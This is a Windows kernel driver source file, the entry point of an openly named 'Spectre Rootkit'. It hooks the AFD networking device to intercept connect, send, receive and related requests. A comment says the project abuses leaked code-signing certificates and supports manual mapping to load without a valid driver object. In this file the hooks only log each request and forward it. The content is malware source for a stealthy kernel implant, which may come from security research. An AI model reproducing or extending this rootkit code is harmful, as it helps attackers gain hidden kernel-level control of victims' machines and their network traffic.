/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "common.h"	
#include "FileObjHook.h"

PFILE_OBJ_HOOK DeviceHook;

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    );

//DRIVER_UNLOAD DriverUnload;
//VOID
//DriverUnload (
//	_In_ PDRIVER_OBJECT DriverObject
//	);
EXTERN_C_END

NTSTATUS HookIoctl (
	_In_ DRIVER_DISPATCH OriginalFunction,
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp
	)
{
	NTSTATUS status;
	PIO_STACK_LOCATION irpStackLocation;

	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);

	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
	{
		DBGPRINT("HookIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", irpStackLocation->Parameters.DeviceIoControl.IoControlCode);
		switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
		{
		case IOCTL_AFD_BIND:
			DBGPRINT("HookIoctl: IOCTL_AFD_BIND.");
			break;
		case IOCTL_AFD_CONNECT:
			DBGPRINT("HookIoctl: IOCTL_AFD_CONNECT.");
			break;
		case IOCTL_AFD_ACCEPT:
			DBGPRINT("HookIoctl: IOCTL_AFD_ACCEPT.");
			break;
		case IOCTL_AFD_RECV:
			DBGPRINT("HookIoctl: IOCTL_AFD_RECV.");
			break;
		case IOCTL_AFD_SEND:
			DBGPRINT("HookIoctl: IOCTL_AFD_SEND.");
			break;
		}
	}
	else
	{
		DBGPRINT("HookIoctl: Major Function %i.", irpStackLocation->MajorFunction);
	}

	status = OriginalFunction(DeviceObject, Irp);

	return status;
}

//
//VOID
//DriverUnload (
//	IN PDRIVER_OBJECT DriverObject
//	)
//{
//	DeviceHook->~FileObjHook();
//	ExFreePoolWithTag(DeviceHook, 'hFpS');
//}

BOOLEAN HookFastIoctl (
	_In_ PFILE_OBJECT FileObject,
	_In_ BOOLEAN Wait,
	_In_ PVOID InputBuffer,
	_In_ ULONG InputBufferLength,
	_Out_ PVOID OutputBuffer,
	_In_ ULONG OutputBufferLength,
	_In_ ULONG IoControlCode,
	_Out_ PIO_STATUS_BLOCK IoStatus,
	_In_ PDEVICE_OBJECT DeviceObject
	)
{
	//DBGPRINT("HookFastIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", IoControlCode);
	switch (IoControlCode)
	{
	case IOCTL_AFD_BIND:
		DBGPRINT("HookFastIoctl: IOCTL_AFD_BIND.");
		break;
	case IOCTL_AFD_CONNECT:
		DBGPRINT("HookFastIoctl: IOCTL_AFD_CONNECT.");
		break;
	case IOCTL_AFD_ACCEPT:
		DBGPRINT("HookFastIoctl: IOCTL_AFD_ACCEPT.");
		break;
	case IOCTL_AFD_RECV:
		DBGPRINT("HookFastIoctl: IOCTL_AFD_RECV.");
		break;
	case IOCTL_AFD_SEND:
		//DBGPRINT("HookFastIoctl: IOCTL_AFD_SEND.");
		break;
	}

	return FileObjHook::OriginalFastIo.FastIoDeviceControl(FileObject, Wait, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, IoControlCode, IoStatus, DeviceObject);
}

/**
	Initialize the Spectre Rootkit.
	@param DriverObject - The object associated with the driver.
	@param RegistryPath - The registry path of the driver.
	@return Status of driver initialization.
*/
NTSTATUS
DriverEntry (
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	FAST_IO_DISPATCH fastIoHooks;

	//
	// We don't know if these parameters are valid.
	// Although this project abuses leaked certificates by default,
	// this project is designed to work in several scenarios, including
	// scenarios such as manual mapping which may not result in a valid
	// driver object or registry path.
	//
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	memset(&fastIoHooks, 0, sizeof(fastIoHooks));
	fastIoHooks.SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH);
	fastIoHooks.FastIoDeviceControl = HookFastIoctl;

	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, HookIoctl, &fastIoHooks);
	return STATUS_SUCCESS;
}